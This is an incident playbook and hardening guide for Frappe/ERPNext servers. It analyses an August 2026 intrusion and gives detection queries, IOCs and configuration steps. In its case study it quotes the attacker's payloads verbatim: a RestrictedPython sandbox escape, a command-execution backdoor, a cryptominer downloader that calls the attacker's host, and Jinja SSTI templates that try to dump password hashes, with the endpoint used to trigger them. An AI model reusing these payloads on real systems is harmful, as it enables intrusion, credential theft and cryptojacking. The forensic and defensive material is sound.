# Security — incident playbook and hardening

**Applies to:** v15 and v16 unless a section says otherwise.

Grounded in a real compromise of the `mandi.trustbit.in` v15 production server
(2026-08-02). The attack **failed**, but an attacker held authenticated
Administrator API access for four hours. Treat the data as exposed.

Everything below was verified against the production database dump
`Backups/20260816_173653-mandi_trustbit_in-database.sql.gz`, the server config
snapshot in `_server_snapshot/meta/`, and frappe **15.100.0** source in
`~/frappe-bench-v15` (the same version prod ran). Where something could not be
re-verified it is marked **unverified**.

---

## 1. Case study — the 2026-08-02 intrusion

### Evidence of record

**Primary evidence is the dump itself** —
`Trustbit Kantishiva/Backups/20260816_173653-mandi_trustbit_in-database.sql.gz`,
re-checkable with the queries in §2. Every artefact named below (`wm_rce_esc`,
`wm_ssti_auth`, `wm_ssti_terms`, the `../../zzrcekn5xyc1f/__init__` path, the attacker IP
`111.90.158.58`, and the `supportxmr` / `.frappe_bench_health` strings) was re-verified
directly against that file.

**Note the broken citation trail:** `SERVER_KANTISHIVA.md` points at `PROJECT_STATE.md`
for "the security incident that preceded the rebuild", but `PROJECT_STATE.md` documents the
same server and **carries no incident record at all**. Do not go looking for it there —
this file plus the dump are the record. (Best fixed at source by adding the incident to
`PROJECT_STATE.md` so that cross-reference resolves.)

### Target

| | |
|---|---|
| Host | `82.112.231.127` (Hostinger VPS, Ubuntu 22.04) |
| Site | `mandi.trustbit.in`, frappe 15.100.0 / erpnext 15.97.0 |
| Attacker IP | `111.90.158.58` — also the host serving the miner payload |
| Secondary payload host | `111.90.139.202` |

### Timeline (server time, from `tabActivity Log`, `tabServer Script`, `tabError Log`)

| Time | Event |
|---|---|
| `17:08:20` | `Administrator logged in` — Success, from `111.90.158.58` |
| `19:41:20` | `Administrator logged in` — Success, same IP |
| `19:41:23.089` | Server Script **`wm_rce_esc`** created (type `API`) |
| `19:41:24.029` | Terms and Conditions **`wm_ssti_terms`** created (SSTI probe) |
| `19:41:24.831` | Terms and Conditions **`wm_ssti_auth`** created (SSTI password-hash dump) |
| `19:45:27.470` | SSTI **executed** → Error Log `(1054, "Unknown column 'field' in 'WHERE'")` |
| `21:11:58.930` | `Administrator logged in` — Success, same IP |
| `21:12:01.674` | Server Script **`../../zzrcekn5xyc1f/__init__`** created (`pwn()` + XMRig) |
| `21:12:04.488` | `Administrator.last_active` — last observed attacker action |

Total window **17:08:20 → 21:12:04 = 4h 03m**.

### Entry: the Administrator password, not an exploit

There are **zero failed logins from `111.90.158.58`** in `tabActivity Log`. The
first attempt succeeded. Frappe does log failures — the same table contains
`Failed / Invalid login credentials` rows for other IPs — so this is absence of
evidence in a table that demonstrably records the event.

The attacker knew the password. Supporting fact: `Administrator.last_password_reset_date`
is `NULL` and `last_reset_password_key_generated_on` is `NULL` — the password had
**never been changed** since the site was created on 2026-02-11.

> A weak or leaked Administrator password was the entire attack surface. No
> framework vulnerability was involved in getting in.

### Four artifacts were planted, not two

**1. `wm_rce_esc` — Server Script, type `API`, RestrictedPython sandbox escape**

```python
hax = "echo WMRCE79877; id"
g=({k:v('os').popen(hax).read() for k,v in g.gi_frame.f_back.f_back.f_back.f_back.f_builtins.items() if 'import' in k}for x in(0,))
for x in g:0
```

Classic generator-frame walk: reach `f_builtins`, pick the key containing
`import` (`__import__`), import `os`, `popen()`. Needs no `import` statement, so
it is not stopped by the usual import guard.

**2. `../../zzrcekn5xyc1f/__init__` — Server Script, type `DocType Event`, on `User` / `Before Save`**

Note the path traversal in both the `name` and the `module` field
(`../../../../apps/frappe/frappe/utils/zzrcekn5xyc1f`) — consistent with an
attempt to have the script written to disk as an importable Python module for
persistence. *(Interpretation of intent — the traversal strings themselves are
verbatim from the dump.)*

The script body declares two functions:

```python
import frappe, subprocess
@frappe.whitelist(allow_guest=True)
def pwn(command=None):
    ...
    out = subprocess.getoutput(command)
    return out
@frappe.whitelist(allow_guest=True)
def mine():
    sh = "BIN=/var/tmp/.frappe_bench_health;CFG=/var/tmp/.frappe_bench_health.json;..."
    return subprocess.getoutput(sh)
```

`mine()` downloads XMRig — first from `http://111.90.158.58/xmrig/xmrig_static`,
falling back to `111.90.139.202`, then to the genuine GitHub release
`xmrig/xmrig v6.22.2` — installs it as **`/var/tmp/.frappe_bench_health`**
(named to look like a bench health check), writes
`/var/tmp/.frappe_bench_health.json`, and `setsid`s it against
`pool.supportxmr.com:443` / `pool.hashvault.pro:443`.

**IOC:** the pool config uses `"pass":"erpnext"` — this is an ERPNext-targeted
campaign, not opportunistic scanning.

**3 & 4. `wm_ssti_terms` and `wm_ssti_auth` — Terms and Conditions, Jinja SSTI**

This is the part that actually executed, and it did **not** involve Server
Scripts at all.

```jinja
{{ frappe.db.sql("select name from `tabUser` where name='Administrator'") }}
{{ frappe.db.sql("select name,password from __Auth where doctype='User' and field='password' limit 12") }}
```

Triggered through a stock ERPNext endpoint:

```
POST /api/method/erpnext.setup.doctype.terms_and_conditions.terms_and_conditions.get_terms_and_conditions
     template_name=wm_ssti_auth   doc={"name":"x"}
```

`get_terms_and_conditions()` calls `frappe.render_template(terms_and_conditions.terms, doc)`,
which renders attacker-controlled Jinja.

### Why it failed — and which control actually did the work

**The Server Script path (artifacts 1 and 2) never ran.** `server_script_enabled`
is absent from **both** config files in the snapshot:

- `_server_snapshot/meta/site_config.live.json` → keys are only `db_name`, `db_password`, `db_type`, `developer_mode`
- `_server_snapshot/meta/common_site_config.json` → no `server_script_enabled`

> **Correction worth knowing:** the flag is read from **`common_site_config.json`**, not
> the per-site `site_config.json`. From `frappe/utils/safe_exec.py:78`:
> ```python
> def is_safe_exec_enabled() -> bool:
>     # server scripts can only be enabled via common_site_config.json
>     return bool(frappe.get_common_site_config().get(SAFE_EXEC_CONFIG_KEY))
> ```
> Checking only `site_config.json` checks the wrong file.

With it unset, `safe_exec()` throws before compiling anything:

```
Server Scripts are disabled. Please enable server scripts from bench configuration.
```

`ServerScriptNotEnabled` subclasses `frappe.PermissionError`, which carries
`http_status_code = 403` (`frappe/exceptions.py:34-35`) — hence the 403.

Two further layers would also have stopped these payloads on 15.100.0. Verified
empirically against the installed frappe, testing only attribute access (no
command execution):

```
# the wm_rce_esc frame walk — rejected at COMPILE time by FrappeTransformer
BLOCKED: SyntaxError | 'Line 1: "gi_frame" is a restricted name, that is forbidden
to access in RestrictedPython.' (also f_back, f_builtins)

# the miner script's `import frappe, subprocess` — fails at RUNTIME
RUNTIME ERROR: ImportError | __import__ not found
```

`gi_frame`, `f_back` and `f_builtins` are in both RestrictedPython's
`INSPECT_ATTRIBUTES` and frappe's own `UNSAFE_ATTRIBUTES`. The payloads were
written against an older, unpatched Frappe.

Also: `@frappe.whitelist(allow_guest=True)` **is inert inside a Server Script**.
`frappe.whitelist` is not in the sandbox namespace (`get_safe_globals()` exposes
only `call_whitelisted_function`), so it resolves to `NamespaceDict`'s fallback
and raises `AttributeError: module has no attribute 'whitelist'` when called. No
guest-callable endpoint was ever created; both records also have `allow_guest = 0`.
The attacker's *intent* was a guest-callable `pwn(command)`; the mechanism could
not have delivered it.

### The genuine near-miss: the SSTI

The SSTI **did execute**. The error `(1054, "Unknown column 'field' in 'WHERE'")`
is a MariaDB error — meaning the query reached the database. It failed only
because the attacker used the frappe **v13-era column name**. The real schema is:

```sql
CREATE TABLE `__Auth` (
  `doctype` varchar(140) NOT NULL,
  `name` varchar(255) NOT NULL,
  `fieldname` varchar(140) NOT NULL,   -- attacker wrote `field`
  `password` text NOT NULL,
  `encrypted` int(1) NOT NULL DEFAULT 0,
  ...
```

`frappe.db.sql` inside a template is wrapped by `read_sql` → `check_safe_sql_query`,
which permits **any** `select`, `explain`, or MariaDB `with`. So the injection had
full read access to the entire database. Had the attacker typed `fieldname`, they
would have received the pbkdf2 password hashes for every user:

```
User  Administrator            password  $pbkdf2  0
User  ra.pandey008@gmail.com   password  $pbkdf2  0
...
```

**A one-word typo was the only thing between this incident and a full credential
dump.** Disabled server scripts did not protect this path at all.

### Three lessons

1. **The Administrator password was the whole attack surface.** No CVE, no
   framework bug, no privilege escalation — just a valid login.
2. **`server_script_enabled` being off stopped the RCE path.** It is the single
   highest-value default on a production Frappe box. It also did *nothing* for
   the SSTI path, so do not treat it as a perimeter.
3. **A database backup carries the backdoor with it.** This is not theoretical —
   the local restore of this dump into `mandi.local` reproduced all four records
   exactly:
   ```
   name: ../../zzrcekn5xyc1f/__init__   script_type: DocType Event   disabled: 0
   name: wm_rce_esc                     script_type: API             disabled: 0
   wm_ssti_auth   {{ frappe.db.sql("select name,password from __Auth ...
   wm_ssti_terms  {{ frappe.db.sql("select name from `tabUser` ...
   ```
   Restore that dump onto a server that *does* have `server_script_enabled: true`
   and the miner deploys on the next `User` save. **Clean the dump, not just the
   server.**

### Status

The host was reformatted and rebuilt as `kantishiva.trustbit.cloud` on ERPNext
v16 (see `SERVER_KANTISHIVA.md`). Live-host verification of the miner's absence —
no binary at `/var/tmp/.frappe_bench_health`, no process, no pool connections —
was performed at the time but **cannot now be re-verified**; the box is gone. The
config and code evidence above independently establishes that the miner code
could not have executed.

---

## 2. How to check a site for this class of compromise

Run these against any site you inherit, and against any backup before you
restore it. Set `SITE` and use the site's own DB credentials from
`sites/<site>/site_config.json`.

```bash
cd ~/frappe-bench
SITE=mandi.trustbit.in
DB=$(python3 -c "import json;print(json.load(open('sites/$SITE/site_config.json'))['db_name'])")
PW=$(python3 -c "import json;print(json.load(open('sites/$SITE/site_config.json'))['db_password'])")
mysql -u"$DB" -p"$PW" "$DB"
```

### 2.1 Server Scripts — should normally be empty

```sql
SELECT name, script_type, reference_doctype, doctype_event, api_method,
       allow_guest, disabled, module, owner, creation
FROM `tabServer Script`;
```

Clean result:

```
Empty set (0.00 sec)
```

Compromised result (real output from the restored mandi DB):

```
name: ../../zzrcekn5xyc1f/__init__
script_type: DocType Event   reference_doctype: User   doctype_event: Before Save
module: ../../../../apps/frappe/frappe/utils/zzrcekn5xyc1f
owner: Administrator         creation: 2026-08-02 21:12:01.674771

name: wm_rce_esc
script_type: API             api_method: wm_rce_esc
owner: Administrator         creation: 2026-08-02 19:41:23.089732
```

Red flags: `../` anywhere in `name` or `module`; `creation` clustered within
seconds; `owner = Administrator` when no human uses that account.

### 2.2 Jinja injection in template-bearing doctypes

The SSTI path is missed entirely if you only check Server Scripts. This query
covers every doctype that renders user-editable Jinja:

```sql
SELECT 'Terms and Conditions' d, name, LEFT(terms,60) v FROM `tabTerms and Conditions` WHERE terms LIKE '%frappe.db.sql%' OR terms LIKE '%__Auth%'
UNION ALL SELECT 'Email Template', name, LEFT(response,60) FROM `tabEmail Template` WHERE response LIKE '%frappe.db.sql%'
UNION ALL SELECT 'Print Format', name, LEFT(html,60) FROM `tabPrint Format` WHERE html LIKE '%frappe.db.sql%'
UNION ALL SELECT 'Notification', name, LEFT(message,60) FROM `tabNotification` WHERE message LIKE '%frappe.db.sql%'
UNION ALL SELECT 'Web Template', name, LEFT(template,60) FROM `tabWeb Template` WHERE template LIKE '%frappe.db.sql%'
UNION ALL SELECT 'Letter Head', name, LEFT(content,60) FROM `tabLetter Head` WHERE content LIKE '%frappe.db.sql%'
UNION ALL SELECT 'Address Template', name, LEFT(template,60) FROM `tabAddress Template` WHERE template LIKE '%frappe.db.sql%';
```

Clean result: `Empty set`. On the compromised DB it returns exactly the two
`wm_ssti_*` rows and no false positives.

### 2.3 Administrator's last login and source IP

```sql
SELECT name, enabled, last_login, last_ip, last_active,
       last_password_reset_date
FROM tabUser WHERE name='Administrator';
```

Compromised result:

```
last_ip: 111.90.158.58
last_login: 2026-08-02 21:11:58.916461
last_active: 2026-08-02 21:12:04.488919
last_password_reset_date: NULL
```

`last_password_reset_date IS NULL` means the install-time password is still in
use. Treat that as a finding on its own.

> **Caveat:** `last_login` / `last_ip` are overwritten by the next login. After
> restoring this dump locally and logging in, the same query returned
> `last_ip: 127.0.0.1`. For forensics, query the **dump**, not a restored copy
> you have already used.

### 2.4 Successful logins grouped by IP

```sql
SELECT ip_address, COUNT(*) n, MIN(creation) first_seen, MAX(creation) last_seen
FROM `tabActivity Log`
WHERE operation='Login' AND status='Success' AND subject LIKE 'Administrator%'
GROUP BY ip_address ORDER BY last_seen;
```

Real output:

```
172.225.201.25   1  2026-05-22 15:15:48  2026-05-22 15:15:48
104.28.219.245   2  2026-06-17 14:04:01  2026-06-17 14:04:02
137.184.157.94   1  2026-06-19 20:40:12  2026-06-19 20:40:12
172.225.201.24   1  2026-07-27 18:28:12  2026-07-27 18:28:12
111.90.158.58    3  2026-08-02 17:08:20  2026-08-02 21:11:58
```

And the full picture including failures:

```sql
SELECT creation, ip_address, status, subject
FROM `tabActivity Log` WHERE operation='Login' ORDER BY creation;
```

**Triage note — do not raise a false alarm.** This dataset contains four
`Failed / Invalid login credentials` from `172.225.201.25` at `15:14:32–15:15:15`
on 2026-05-22 followed by a successful `Administrator logged in` at `15:15:48`.
That looks like a brute force, but `172.225.201.25` is also
`ra.pandey008@gmail.com`'s `last_ip` — it is the owner mistyping their own
password. The attacker session is distinguishable precisely because it has
**no failures at all**.

Administrator logging in from many different IPs over time (`104.28.219.245`,
`137.184.157.94`, …) is itself the underlying hygiene problem — see §3.8.

### 2.5 Other persistence to rule out

```sql
SELECT 'Webhook' t, COUNT(*) n FROM tabWebhook
UNION ALL SELECT 'Client Script', COUNT(*) FROM `tabClient Script`
UNION ALL SELECT 'Notification', COUNT(*) FROM tabNotification
UNION ALL SELECT 'Users with API key', COUNT(*) FROM tabUser WHERE api_key IS NOT NULL
UNION ALL SELECT 'Enabled users', COUNT(*) FROM tabUser WHERE enabled=1;
```

Then check who can create Server Scripts:

```sql
SELECT parent FROM `tabHas Role` WHERE role='Script Manager';
```

On the mandi site this returned **all four accounts** —
`Administrator`, `ra.pandey008@gmail.com`, `saransh@gmail.com`,
`user36@gmail.com`. Any of them could have created the same backdoor the moment
server scripts were enabled. Strip `Script Manager` from everyone who does not
actively write server scripts.

### 2.6 nginx access logs

```bash
sudo grep '111\.90\.158\.58' /var/log/nginx/access.log*
sudo zgrep '111\.90\.158\.58' /var/log/nginx/access.log.*.gz
sudo grep -E 'POST /api/method/login' /var/log/nginx/access.log | awk '{print $1}' | sort | uniq -c | sort -rn | head
```

**Unverified on this host** — the server was reformatted before logs were
collected; `/var/log/nginx/access.log` is the Debian/Ubuntu default path, not
something confirmed on the mandi box. Note also that logs rotate, and a
four-hour session from three weeks earlier may already be gone. The database
tables above are the durable evidence.

### 2.7 Host-level checks for the miner

```bash
ls -la /var/tmp/.frappe_bench_health /var/tmp/.frappe_bench_health.json
pgrep -af /var/tmp/.frappe_bench_health
ss -tnp | grep -E ':443' | grep -Ei 'supportxmr|hashvault'
grep -rEl 'supportxmr|hashvault|xmrig' /var/tmp /tmp 2>/dev/null
uptime   # sustained 100% CPU on a 1-vCPU box is the usual first symptom
```

Clean result: no such files, no matching processes, no output.

---

## 3. Hardening checklist for every deployment

Applies to **v15 and v16**.

| # | Control | Why |
|---|---|---|
| 1 | Strong unique Administrator password, rotated off the install value | The entire root cause of §1 |
| 2 | `server_script_enabled` absent from `common_site_config.json` | Blocked the RCE path |
| 3 | `ufw` allowing 22/80/443 only | — |
| 4 | fail2ban with a jail that actually counts | — |
| 5 | MariaDB on `127.0.0.1`, no anonymous users | — |
| 6 | HTTPS with HTTP→HTTPS redirect | — |
| 7 | Administrator is break-glass only; humans get named accounts | Attribution and revocation |
| 8 | Strip `Script Manager` from everyone who does not need it | §2.5 |

### 3.1 Administrator password

Set a strong unique password at site creation and change it after handover.
`bench new-site` takes it non-interactively:

```bash
bench new-site <site> --admin-password '<strong-unique>' \
  --db-root-username root --db-root-password '<root-pw>' \
  --install-app erpnext --set-default
```

Rotate later with:

```bash
bench --site <site> set-admin-password '<new-strong-password>'
```

Verify it has actually been rotated — `NULL` here means it never has:

```sql
SELECT last_password_reset_date FROM tabUser WHERE name='Administrator';
```

Raise the policy in **System Settings**: `minimum_password_score` to 3,
`allow_consecutive_login_attempts` to 5, and enable two-factor auth for
System Manager accounts.

### 3.2 Server scripts — leave them off

Do nothing; the default is off. Confirm:

```bash
grep server_script_enabled ~/frappe-bench/sites/common_site_config.json || echo "not set - correct"
```

Only if genuinely required:

```bash
bench config set-common-config -c server_script_enabled true
```

Turning this on means anyone with `Script Manager` gets code execution as the
`frappe` user. In §1 that would have been four accounts. Prefer shipping logic in
a real app (`hooks.py`, a proper doctype controller) — see the `item_creator` app
for the structure. If you must enable it, strip `Script Manager` to one account
first and audit `tabServer Script` on every deploy.

### 3.3 Firewall — order matters or you lock yourself out

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw --force enable
sudo ufw status verbose
```

Allow rules go in **before** `--force enable`; `--force` skips the "may disrupt
existing ssh connections" prompt. Confirm the real SSH port with
`ss -ltnp | grep sshd` first. Keep a second SSH session open throughout, and
re-verify SSH from a new session before closing the first — this is exactly what
was done on the Kantishiva v16 build.

Do **not** use `bench setup firewall`; it calls an Ansible playbook that is not
present on a fresh VPS.

Then confirm nothing else is public:

```bash
ss -ltn   # 3306, 11000, 13000, 9000 must all be 127.0.0.1
```

### 3.4 fail2ban

`bench setup production` aborts on `bench setup role fail2ban` when Ansible is
absent. Install it from apt instead and run `bench setup supervisor --yes` /
`bench setup nginx --yes` individually.

```bash
sudo apt-get install -y fail2ban
printf '[sshd]\nbackend = systemd\njournalmatch = _COMM=sshd\nmaxretry = 3\nfindtime = 10m\nbantime = 1h\n' \
  | sudo tee /etc/fail2ban/jail.d/99-sshd.local
sudo systemctl restart fail2ban
sudo fail2ban-client status sshd
```

**A running fail2ban is not a working fail2ban.** On another Trustbit server the
jail reported `active` while counting **0 of 45** real SSH failures in 24h,
because it filtered on `_SYSTEMD_UNIT=sshd.service` — a unit that does not exist
on Debian/Ubuntu (it is `ssh.service`, and socket activation logs under
`ssh@<n>-<ip>:22-….service`). Always cross-check the counter against the journal:

```bash
sudo journalctl -u ssh -u 'ssh@*' --since -24h | grep -ciE "Failed password|authentication failure"
sudo fail2ban-client status sshd | grep "Total failed"
```

If those two numbers disagree, the jail is blind.

### 3.5 MariaDB

```bash
sudo ss -ltnp | grep 3306          # expect 127.0.0.1:3306 only
sudo mysql -e "SELECT user,host FROM mysql.user WHERE user='' OR host NOT IN ('localhost','127.0.0.1');"
sudo mysql -e "SHOW DATABASES LIKE 'test';"
```

Clean result: `3306` bound to `127.0.0.1`, and **empty sets** for both queries.
On Ubuntu 26.04 the packaged MariaDB 11.8.6 ships secure by default — this was
verified by query rather than by running `mariadb-secure-installation` blindly.

### 3.6 HTTPS

Use `certbot certonly --nginx`, **never** `certbot --nginx`.
`/etc/nginx/conf.d/frappe-bench.conf` is a symlink to the bench-generated config;
certbot's installer mode rewrites it and the next `bench setup nginx` destroys
the change. `certonly` only solves the challenge and leaves server blocks alone.
Then let bench own the config:

```bash
bench config dns_multitenant on          # BEFORE bench setup nginx
bench --site <site> set-config ssl_certificate     /etc/letsencrypt/live/<domain>/fullchain.pem
bench --site <site> set-config ssl_certificate_key /etc/letsencrypt/live/<domain>/privkey.pem
bench --site <site> set-config host_name           https://<domain>
bench setup nginx --yes
sudo nginx -t && sudo systemctl reload nginx
```

**Not `bench set-ssl-certificate` / `bench set-ssl-key`:** those regenerate nginx
immediately (`set_site_config_nginx_property()` → `make_nginx_conf(bench_path=bench_path)`
with `yes=False`, `bench/config/site_config.py:51-59`) and have **no `--yes` flag**
(`bench/commands/utils.py:53-68` — positional args only), so on a non-TTY SSH session they
hang on `nginx.conf already exists and this will overwrite it. Do you want to continue?`.
`set-config` edits `site_config.json` only; the explicit `bench setup nginx --yes` does the
regeneration. Full detail: [ssl-nginx-and-production.md §4.3](ssl-nginx-and-production.md).

With `dns_multitenant` off, bench silently ignores `ssl_certificate` in
site_config and can never emit an HTTPS block. Verify the redirect:

```bash
curl -sI http://<domain> | head -1     # expect 301
```

Use apt certbot + `python3-certbot-nginx`; never mix with the snap. Skip
`bench setup lets-encrypt` entirely.

### 3.7 Host header

`serve_default_site: true` means **any** Host header resolves to the default
site. The Error Log from the incident shows the attacker's request arriving with
`Host: manishbookdepot.in` and still being served. Harmless on a single-site box,
but it means hostname-based access assumptions are not a control.

### 3.8 Accounts

Give every human their own account with the narrowest role profile that fits
their job. Keep `Administrator` for break-glass only, with its password in the
password manager and not in day-to-day use. In §1, Administrator was in routine
use from at least five different IPs, which is why nothing looked unusual.

Audit periodically:

```sql
SELECT name, enabled, last_login, last_ip FROM tabUser
WHERE enabled=1 AND user_type='System User' ORDER BY last_login;
```

Disable dormant accounts (`last_login IS NULL`).

---

## 4. Secrets hygiene

`sites/<site>/site_config.json` contains `db_password` in plaintext, and on many
sites `encryption_key` as well — the key that decrypts stored OAuth tokens,
email passwords and other secrets. Backups contain the entire customer database
including the `__Auth` password hashes.

**Never commit either.** Never paste them into a project markdown file, either —
credentials in a tracked `.md` are the same exposure with extra steps.

### .gitignore

Real pattern, from the Trustbit Kantishiva project root:

```gitignore
# Never commit anything in here — these hold live credentials and customer data.
#
# _server_snapshot/meta/site_config.live.json  -> production db_password
# Backups/*-site_config_backup.json            -> production db_password
# Backups/*.sql.gz, *.tar                      -> full customer database + files
#
# The app source in App/<app>/ is its own git repo and is what gets
# pushed to GitHub — not this outer folder.

_server_snapshot/
Backups/

.DS_Store
*.pyc
__pycache__/
```

A broader pattern for a bench or app repo:

```gitignore
sites/*/site_config.json
sites/common_site_config.json
sites/*/private/backups/
*-database.sql.gz
*-site_config_backup.json
*-files.tar
*-private-files.tar
production-credentials.txt
*.pem
*.key
```

### On-disk permissions

```bash
cd ~/frappe-bench
chmod 640 sites/*/site_config.json sites/common_site_config.json
chmod 750 sites/<site>/private/backups
chmod 640 sites/<site>/private/backups/*
chmod 750 /home/frappe
bench --site <site> set-config encrypt_backup 1     # applies to NEW backups only
```

Default mode `664` is world-readable, and a VPS usually has a second shell
account (`ubuntu`). Ship backups off-box; on the same disk they protect nothing.

### Cleaning a backup before restoring it

Because a dump carries backdoors (§1, lesson 3), clean it on the way in — not
after. Restore, then immediately, **before** enabling anything or exposing the
site:

```bash
bench --site <newsite> mariadb
```
```sql
DELETE FROM `tabServer Script`;
DELETE FROM `tabTerms and Conditions` WHERE terms LIKE '%{{%';
SELECT name, last_ip, last_login FROM tabUser WHERE name='Administrator';
```
```bash
bench --site <newsite> set-admin-password '<new-strong-password>'
bench --site <newsite> clear-cache
```

The blanket `clear-cache` is fine here — this site is **not yet serving anyone**, which is
the whole point of doing it before exposure. On a **live production** site it is forbidden
(it deletes every redis key for the site); use the targeted form from `bench console`
instead — see [v15/install-and-gotchas.md §11](../v15/install-and-gotchas.md):

```python
frappe.clear_cache(doctype="Server Script")
from frappe.cache_manager import clear_global_cache; clear_global_cache()
```

Re-run every query in §2 against the new site and confirm empty results before
putting it on the internet.

---

## 5. fail2ban will ban your own IP

This happened during response to this incident. From the source-server notes:

> SSH note: root password login; fail2ban is active (avoid rapid failed logins —
> it bans the source IP for ~10 min).

**Symptom:** SSH goes from working, to `Permission denied`, to the port simply
not answering. `nmap`/`nc` flips from `open` to `refused` or times out, and the
web site on 80/443 keeps working fine — which is the tell that it is a per-IP
ban and not an outage.

```
ssh: connect to host <ip> port 22: Connection refused
```

**Options, in order of preference:**

1. **Wait it out.** `bantime` was ~10 minutes there; the `99-sshd.local` above
   sets `1h`. Do not keep retrying — each attempt can extend the ban.
2. **Use the provider's web console** (Hostinger, DigitalOcean, etc.). It reaches
   the VM out-of-band, bypassing sshd and fail2ban entirely. From there:
   ```bash
   sudo fail2ban-client status sshd
   sudo fail2ban-client set sshd unbanip <your-ip>
   ```
3. **Connect from a different IP** — phone hotspot, another VPS.

**Prevention:** put your key on the box and use it (`ssh-copy-id`), so you are
never typing a password. Before any long remote session, whitelist your own
address:

```bash
sudo tee -a /etc/fail2ban/jail.d/99-sshd.local <<'EOF'
ignoreip = 127.0.0.1/8 ::1 <your-office-ip>/32
EOF
sudo systemctl restart fail2ban
```

Keep a second SSH session open whenever you are changing SSH, ufw or fail2ban
config. It is the cheapest insurance there is.
